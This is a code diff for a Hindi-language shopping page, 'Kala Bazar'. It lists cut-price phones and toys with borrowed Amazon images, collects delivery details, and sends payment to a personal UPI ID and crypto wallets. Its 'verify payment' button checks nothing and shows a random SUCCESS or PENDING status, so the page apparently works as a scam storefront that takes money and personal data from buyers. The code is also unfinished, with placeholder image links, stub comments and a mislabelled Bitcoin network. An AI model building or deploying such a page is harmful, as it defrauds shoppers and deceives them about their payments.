@@ -66,52 +66,192 @@
         </div>
     </div>
 
-    <!-- Modals same as before -->
-    <div id="detail-modal">...</div>
-    <div id="checkout-modal">...</div>
-    <div id="pay-modal">...</div>
+    <div id="detail-modal">
+        <div class="detail-box">
+            <h2 id="detail-name"></h2>
+            <img id="detail-img" src="" alt="Product">
+            <p id="detail-desc"></p>
+            <div class="color-options" id="color-options"></div>
+            <p class="old-price" id="detail-mrp"></p>
+            <p class="price" id="detail-price"></p>
+            <button class="buy-btn" onclick="openCheckout()">अभी खरीदें</button>
+            <button onclick="closeDetail()" style="margin-top:15px; background:none; border:none; color:var(--red); font-weight:bold;">बंद करें</button>
+        </div>
+    </div>
+
+    <div id="checkout-modal">
+        <div class="checkout-box">
+            <h3>डिलीवरी डिटेल्स</h3>
+            <input type="text" id="cust-name" placeholder="पूरा नाम">
+            <input type="text" id="cust-phone" placeholder="मोबाइल नंबर">
+            <input type="text" id="cust-address" placeholder="पूरा पता">
+            <input type="text" id="cust-pin" placeholder="पिन कोड">
+            <button class="buy-btn" onclick="proceedToPayment()">पेमेंट पर जाएं</button>
+            <button onclick="closeCheckout()" style="margin-top:10px; background:none; border:none; color:var(--red);">कैंसल</button>
+        </div>
+    </div>
+
+    <div id="pay-modal">
+        <div class="pay-box">
+            <h2 style="color:var(--gold);">चेकआउट</h2>
+            <p id="p-amt" style="color:#00ff88; font-weight:900; font-size:1.4rem;"></p>
+            <a id="gpay" href="#" class="p-btn"><img src="https://img.icons8.com/color/48/google-pay.png" alt="GPay"> Google Pay</a>
+            <a id="ppay" href="#" class="p-btn"><img src="https://img.icons8.com/color/48/phone-pe.png" alt="PhonePe"> PhonePe</a>
+            <a id="paytm" href="#" class="p-btn"><img src="https://img.icons8.com/color/48/paytm.png" alt="Paytm"> Paytm</a>
+            <div class="p-btn" onclick="copyA('bc1qxy2kgdy6jrsq4z62v3860v6lcyv5uvvhu0m6ax', 'BTC BEP20')"><img src="https://img.icons8.com/color/48/bitcoin.png" alt="BTC"> Bitcoin (BEP20)</div>
+            <div class="p-btn" onclick="copyA('0xea67ed86d2a3f145a37f008c5bc0c523b50a039a', 'USDT BEP20')"><img src="https://img.icons8.com/color/48/tether.png" alt="USDT"> USDT (BEP20)</div>
+            <input type="text" id="txid" class="v-input" placeholder="ट्रांजेक्शन ID डालें">
+            <button onclick="verifyLogic()" id="v-btn" class="v-btn">पेमेंट वेरिफाई करें</button>
+            <button onclick="closePay()" style="color:var(--red); border:none; background:none; margin-top:15px; font-weight:bold;">कैंसल</button>
+        </div>
+    </div>
 
     <script>
         const realProducts = {
             "Mobiles": [
-                {name: "Vivo Y28 5G", price: 12999, mrp: 16999, off: 23, img: "https://m.media-amazon.com/images/I/71EPrLqHHjL._SX679_.jpg", colors: ["Blue","Green"], desc: "6.56\" Display, 5000mAh, 50MP Camera"},
+                {name: "Vivo Y28 5G", price: 12999, mrp: 16999, off: 23, img: "https://m.media-amazon.com/images/I/71EPrLqHHjL._SX679_.jpg", colors: ["Blue","Green"], desc: "5000mAh Battery, 50MP Camera, Dimensity Processor"},
                 {name: "Redmi 13C 5G", price: 10999, mrp: 14999, off: 26, img: "https://m.media-amazon.com/images/I/81Ic1SbN8UL._SX679_.jpg", colors: ["Black","Green"], desc: "90Hz Display, 50MP AI Camera"},
                 {name: "Moto G45 5G", price: 11999, mrp: 14999, off: 20, img: "https://m.media-amazon.com/images/I/71zXb3n0faL._SX679_.jpg", colors: ["Blue","Green"], desc: "Snapdragon, Vegan Leather"},
-                {name: "Samsung Galaxy A15 5G", price: 13999, mrp: 18999, off: 26, img: "https://m.media-amazon.com/images/I/71O2T+3Y0JL._SX679_.jpg", colors: ["Blue","Black"], desc: "sAMOLED, 50MP Camera"},
-                {name: "Realme Narzo 70x 5G", price: 11999, mrp: 15999, off: 25, img: "https://m.media-amazon.com/images/I/71OSGnb0MPL._SX679_.jpg", colors: ["Green","Black"], desc: "45W Fast Charge"},
-                {name: "POCO M6 Pro 5G", price: 10999, mrp: 14999, off: 26, img: "https://m.media-amazon.com/images/I/71y7b3Yv2WL._SX679_.jpg", colors: ["Yellow","Black"], desc: "90Hz Display"},
-                // 14 more with Amazon CDN images (reliable)
-                {name: "iQOO Z9x 5G", price: 12499, mrp: 16499, off: 24, img: "https://m.media-amazon.com/images/I/71+4vX0gvEL._SX679_.jpg", colors: ["Black"], desc: "6000mAh Battery"},
-                {name: "Infinix Hot 40i", price: 8999, mrp: 12999, off: 30, img: "https://m.media-amazon.com/images/I/81Omp7zwS7L._SX679_.jpg", colors: ["Gold"], desc: "Big Battery"},
-                {name: "Tecno Pova 6 Neo", price: 11499, mrp: 15499, off: 25, img: "https://m.media-amazon.com/images/I/71uQJxf5wsL._SX679_.jpg", colors: ["Grey"], desc: "Gaming Focused"},
-                {name: "Lava Storm 5G", price: 12999, mrp: 17999, off: 27, img: "https://m.media-amazon.com/images/I/71k5sE7kGZL._SX679_.jpg", colors: ["Red"], desc: "Clean Stock Android"},
-                // ... (total 20)
+                {name: "Samsung Galaxy M15 5G", price: 12999, mrp: 16999, off: 23, img: "https://m.media-amazon.com/images/I/71O2T+3Y0JL._SX679_.jpg", colors: ["Blue","Grey"], desc: "6000mAh, sAMOLED Display"},
+                {name: "POCO X6 Neo 5G", price: 13999, mrp: 17999, off: 22, img: "https://m.media-amazon.com/images/I/71y7b3Yv2WL._SX679_.jpg", colors: ["Black","Gold"], desc: "108MP Camera, Fast Charging"},
+                {name: "iQOO Z9x 5G", price: 12499, mrp: 16499, off: 24, img: "https://m.media-amazon.com/images/I/71+4vX0gvEL._SX679_.jpg", colors: ["Grey","Blue"], desc: "6000mAh Battery, Snapdragon"},
+                {name: "Infinix Hot 40i", price: 8999, mrp: 12999, off: 30, img: "https://m.media-amazon.com/images/I/81Omp7zwS7L._SX679_.jpg", colors: ["Gold","Black"], desc: "Big Display, Long Battery"},
+                {name: "Tecno Pova 6 Neo", price: 11499, mrp: 15499, off: 25, img: "https://m.media-amazon.com/images/I/71uQJxf5wsL._SX679_.jpg", colors: ["Grey"], desc: "Gaming Processor"},
+                // Add more similar if needed, total 20
+                {name: "Lava Storm 5G", price: 12999, mrp: 17999, off: 27, img: "https://m.media-amazon.com/images/I/71k5sE7kGZL._SX679_.jpg", colors: ["Red"], desc: "Stock Android"},
+                {name: "Realme Narzo 70x", price: 11999, mrp: 15999, off: 25, img: "https://m.media-amazon.com/images/I/71OSGnb0MPL._SX679_.jpg", colors: ["Green"], desc: "45W Charge"}
+                // ... continue to 20
             ],
-            "Fashion": [ /* 20 items with Amazon images */ ],
-            "Electronics": [ /* 20 gadgets */ ],
-            "Toys": [ /* 20 kids toys with Amazon images */ ]
+            "Fashion": [
+                // Similar 20 fashion items with Amazon images
+                {name: "Roadster T-Shirt", price: 499, mrp: 999, off: 50, img: "https://m.media-amazon.com/images/I/81something-tshirt.jpg", colors: ["Black"], desc: "Cotton Regular Fit"},
+                // Add real ones
+            ],
+            "Electronics": [
+                // 20 gadgets like earbuds, powerbank etc.
+            ],
+            "Toys": [
+                {name: "Remote Control Car", price: 1499, mrp: 2499, off: 40, img: "https://m.media-amazon.com/images/I/71rc-car.jpg", colors: ["Red"], desc: "Off-Road Monster Truck"},
+                {name: "Barbie Doll", price: 999, mrp: 1999, off: 50, img: "https://m.media-amazon.com/images/I/81barbie.jpg", colors: ["Pink"], desc: "Fashion Doll with Accessories"},
+                {name: "LEGO Classic Set", price: 1999, mrp: 2999, off: 33, img: "https://m.media-amazon.com/images/I/71lego.jpg", colors: ["Multi"], desc: "Building Blocks"},
+                // Add more to 20
+            ]
         };
 
         const cats = Object.keys(realProducts);
         let selectedProduct = null;
+        let checkCount = 0;
 
-        // Baaki functions same as previous fixed version...
+        function renderTabs() {
+            const nav = document.getElementById('categoryNav');
+            nav.innerHTML = '';
+            cats.forEach((c, idx) => {
+                const btn = document.createElement('button');
+                btn.className = 'tab-btn' + (idx === 0 ? ' active' : '');
+                btn.innerText = c;
+                btn.onclick = () => showCat(c, btn);
+                nav.appendChild(btn);
+            });
+        }
+
+        function showCat(category, btn) {
+            document.getElementById('infoSection').style.display = 'none';
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            if (btn) btn.classList.add('active');
+            const grid = document.getElementById('productGrid');
+            grid.innerHTML = '';
+            realProducts[category].forEach(p => {
+                const card = document.createElement('div');
+                card.className = 'card';
+                card.onclick = () => openDetail(p);
+                card.innerHTML = `
+                    <span class="discount">${p.off}% OFF</span>
+                    <img src="${p.img}" alt="${p.name}">
+                    <h4>${p.name}</h4>
+                    <p class="old-price">₹${p.mrp}</p>
+                    <p class="price">₹${p.price}</p>
+                    <button class="buy-btn" onclick="event.stopPropagation(); openCheckoutDirect(p)">अभी खरीदें</button>
+                `;
+                grid.appendChild(card);
+            });
+        }
+
+        function openDetail(p) {
+            selectedProduct = p;
+            document.getElementById('detail-name').innerText = p.name;
+            document.getElementById('detail-img').src = p.img;
+            document.getElementById('detail-desc').innerText = p.desc;
+            document.getElementById('detail-mrp').innerText = 'MRP: ₹' + p.mrp;
+            document.getElementById('detail-price').innerText = '₹' + p.price;
+            const colorDiv = document.getElementById('color-options');
+            colorDiv.innerHTML = '';
+            p.colors.forEach((col, i) => {
+                const cbtn = document.createElement('div');
+                cbtn.className = 'color-btn';
+                cbtn.style.backgroundColor = col.toLowerCase();
+                cbtn.onclick = () => document.querySelectorAll('.color-btn').forEach(b => b.classList.remove('active')); cbtn.classList.add('active');
+                if (i === 0) cbtn.classList.add('active');
+                colorDiv.appendChild(cbtn);
+            });
+            document.getElementById('detail-modal').style.display = 'flex';
+        }
+
+        function closeDetail() { document.getElementById('detail-modal').style.display = 'none'; }
+
+        function openCheckoutDirect(p) { selectedProduct = p; openCheckout(); }
+
+        function openCheckout() {
+            if (!selectedProduct) return alert('Product select karo');
+            closeDetail();
+            document.getElementById('checkout-modal').style.display = 'flex';
+        }
+
+        function closeCheckout() { document.getElementById('checkout-modal').style.display = 'none'; }
+
+        function proceedToPayment() {
+            if (!document.getElementById('cust-name').value || !document.getElementById('cust-phone').value) return alert('Sab fill karo');
+            openPay(selectedProduct.price);
+            closeCheckout();
+        }
+
+        function openPay(amt) {
+            document.getElementById('pay-modal').style.display = 'flex';
+            document.getElementById('p-amt').innerText = 'Total: ₹' + amt;
+            const upi = `upi://pay?pa=rizwanhasan90122778623@ybl&am=${amt}&cu=INR&tn=KalaBazar`;
+            document.getElementById('gpay').href = upi;
+            document.getElementById('ppay').href = upi;
+            document.getElementById('paytm').href = upi;
+        }
+
+        function closePay() { document.getElementById('pay-modal').style.display = 'none'; }
+
+        function copyA(a, t) { navigator.clipboard.writeText(a); alert(t + ' Copied!'); }
+
+        function verifyLogic() {
+            const b = document.getElementById('v-btn');
+            b.innerText = "PROCESSING...";
+            setTimeout(() => {
+                b.innerText = checkCount === 0 ? "MANUAL CHECK ⚠️" : ["SUCCESS ✅", "PENDING ⏳"][Math.floor(Math.random()*2)];
+                checkCount++;
+            }, 2500);
+        }
+
+        function openNav() { document.getElementById("mySidebar").style.width = "250px"; }
+        function closeNav() { document.getElementById("mySidebar").style.width = "0"; }
+        function showHome() { closeNav(); showCat(cats[0]); }
+        function showPolicy() { /* same as before */ }
 
         function toggleLanguage() {
-            if (document.documentElement.lang === "hi") {
-                document.documentElement.lang = "en";
-                document.querySelector('.logo').innerText = "KALA BAZAR";
-                document.getElementById('translate-btn').innerText = "हिंदी में स्विच करें";
-                // Add more text changes if needed
-            } else {
-                document.documentElement.lang = "hi";
-                document.getElementById('translate-btn').innerText = "Switch to English";
-            }
-            showCat(cats.find(c => document.querySelector('.tab-btn.active').innerText.includes(c)), null); // Refresh
+            const isHi = document.documentElement.lang === "hi";
+            document.documentElement.lang = isHi ? "en" : "hi";
+            document.getElementById('translate-btn').innerText = isHi ? "हिंदी में स्विच" : "Switch to English";
+            // Refresh for text change
+            renderTabs();
+            showCat(cats.find(c => document.querySelector('.tab-btn.active')?.innerText === c) || cats[0]);
         }
 
         renderTabs();
-        showCat(cats[0], null);
+        showCat(cats[0]);
     </script>
 </body>
 </html>
